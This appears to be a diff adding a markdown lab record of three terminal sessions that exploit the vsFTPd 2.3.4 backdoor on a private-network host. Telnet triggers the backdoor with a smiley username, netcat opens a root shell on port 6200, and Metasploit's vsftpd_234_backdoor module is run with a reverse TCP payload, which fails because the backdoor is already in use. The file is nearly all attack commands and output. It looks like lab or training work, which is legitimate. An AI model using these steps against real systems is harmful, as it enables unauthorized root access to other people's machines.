@@ -1,0 +1,95 @@
+## First console
+
+```
+┌──(kali㉿kali)-[~]
+└─$ telnet 192.168.100.20 21
+Trying 192.168.100.20...
+Connected to 192.168.100.20.
+Escape character is '^]'.
+220 (vsFTPd 2.3.4)
+user backdoored:)
+331 Please specify the password.
+pass anything
+
+```
+
+## Second console
+
+```
+┌──(kali㉿kali)-[~]
+└─$ nc 192.168.100.20 6200
+id
+uid=0(root) gid=0(root)
+```
+
+## Third console
+
+```
+┌──(kali㉿kali)-[~]
+└─$ msfconsole 
+
+Metasploit tip: Execute a command across all sessions with sessions -C 
+<command>
+                                                  
+                                   ___          ____
+                               ,-""   `.      < HONK >
+                             ,'  _   e )`-._ /  ----
+                            /  ,' `-._<.===-'
+                           /  /
+                          /  ;
+              _          /   ;
+ (`._    _.-"" ""--..__,'    |
+ <_  `-""                     \
+  <`-                          :
+   (__   <__.                  ;
+     `-.   '-.__.      _.'    /
+        \      `-.__,-'    _,'
+         `._    ,    /__,-'
+            ""._\__,'< <____
+                 | |  `----.`.
+                 | |        \ `.
+                 ; |___      \-``
+                 \   --<
+                  `.`.<
+                    `-'
+
+                                                                             
+
+       =[ metasploit v6.4.116-dev                               ]
++ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
++ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > use exploit/unix/ftp/vsftpd_234_backdoor
+[*] Using configured payload cmd/linux/http/x86/meterpreter_reverse_tcp
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.100.20
+RHOSTS => 192.168.100.20
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
+RPORT => 21
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 127.0.0.1
+set => LHOST 127.0.0.1
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+[!] 192.168.100.20:21 - The port used by the backdoor bind listener is already open. Trying...
+[-] 192.168.100.20:21 - The service on port 6200/TCP does not appear to be a fresh shell. Already exploited?
+[-] 192.168.100.20:21 - Exploit aborted due to failure: none: Backdoor already in-use
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.100.10
+LHOST => 192.168.100.10
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] Started reverse TCP handler on 192.168.100.10:4444 
+[!] 192.168.100.20:21 - The port used by the backdoor bind listener is already open. Trying...
+[-] 192.168.100.20:21 - The service on port 6200/TCP does not appear to be a fresh shell. Already exploited?
+[-] 192.168.100.20:21 - Exploit aborted due to failure: none: Backdoor already in-use
+[*] Exploit completed, but no session was created.
+msf exploit(unix/ftp/vsftpd_234_backdoor) > 
+msf exploit(unix/ftp/vsftpd_234_backdoor) > set LHOST 192.168.100.20
+LHOST => 192.168.100.20
+msf exploit(unix/ftp/vsftpd_234_backdoor) > run
+ 
+
+```
